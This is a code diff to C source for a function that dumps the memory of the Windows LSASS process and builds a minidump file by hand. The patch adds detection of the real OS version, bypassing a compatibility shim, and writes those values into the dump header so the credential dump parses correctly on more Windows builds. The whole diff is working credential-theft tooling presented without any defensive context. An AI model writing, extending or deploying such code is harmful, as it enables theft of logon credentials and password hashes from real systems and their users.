@@ -742,6 +742,15 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial)
     NtReadVM_t ntReadVM = hNtdll ? (NtReadVM_t)GetProcAddress(hNtdll, "NtReadVirtualMemory") : NULL;
     if (!ntReadVM) return NULL;
 
+    /* detect real OS version via RtlGetVersion (bypasses GetVersionEx compat shim) */
+    typedef LONG (NTAPI *RtlGetVersion_t)(OSVERSIONINFOW *);
+    OSVERSIONINFOW osvi = {0}; osvi.dwOSVersionInfoSize = sizeof(osvi);
+    RtlGetVersion_t pfnRtlGetVersion = hNtdll ? (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion") : NULL;
+    if (pfnRtlGetVersion) pfnRtlGetVersion(&osvi);
+    DWORD os_major = osvi.dwMajorVersion ? osvi.dwMajorVersion : 10;
+    DWORD os_minor = osvi.dwMinorVersion;
+    DWORD os_build = osvi.dwBuildNumber  ? osvi.dwBuildNumber  : 19041;
+
     /* find lsass PID if not provided */
     if (!lsas_pid) {
         HANDLE snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -923,9 +932,9 @@ static uint8_t *lsass_dump_nt(DWORD lsas_pid, size_t *out_len, int *out_partial)
     WU16(sys_info_off+2,  6);     /* ProcessorLevel */
     buf[sys_info_off+6] = 1;      /* NumberOfProcessors */
     buf[sys_info_off+7] = 1;      /* ProductType */
-    WU32(sys_info_off+8,  10);    /* MajorVersion */
-    WU32(sys_info_off+12, 0);     /* MinorVersion */
-    WU32(sys_info_off+16, 19041); /* BuildNumber */
+    WU32(sys_info_off+8,  os_major); /* MajorVersion */
+    WU32(sys_info_off+12, os_minor); /* MinorVersion */
+    WU32(sys_info_off+16, os_build); /* BuildNumber */
     WU32(sys_info_off+20, 2);     /* PlatformId */
     /* CSDVersionRva → 6-byte empty MINIDUMP_STRING appended after the 56-byte struct
      * (Length=0, null wchar = 00 00 00 00 00 00, already zeroed by calloc) */
